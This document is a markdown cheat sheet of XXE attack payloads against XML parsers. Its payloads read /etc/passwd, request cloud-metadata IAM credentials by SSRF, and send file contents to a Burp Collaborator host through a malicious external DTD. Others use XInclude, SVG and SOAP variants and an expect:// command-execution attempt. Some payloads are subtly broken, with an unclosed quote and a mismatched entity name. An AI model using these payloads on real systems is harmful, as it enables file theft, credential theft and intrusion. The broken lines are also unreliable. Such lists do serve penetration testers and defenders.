# XXE Cheatsheet

## using external entities
```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

## perform SSRF attacks
```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
```

## Blind XXE with out-of-band interaction
```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://burp-collab"> ]>
```

## Blind XXE with out-of-band interaction via XML parameter entities
```xml
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://burp-collaborator> %xxe; ]>
```

## blind XXE to exfiltrate data using a malicious external DTD
DTD file
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; test SYSTEM 'http://burp-collaborator/?a=%file;'>">
%eval;
%test;
```

## blind XXE to retrieve data via error messages
DTD file:
```xml
<!ENTITY % passwd SYSTEM "file:///etc/passwd">
<!ENTITY % notvalid "<!ENTITY &#x25; test SYSTEM 'file:///invalid/%file;'>">
%notvalid;
%test;
```

## XInclude to retrieve files
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## XXE via image file upload
```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

## XXE inside SOAP body
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```

## XXE: Base64 Encoded:
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

## XXE inside SVG
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
```





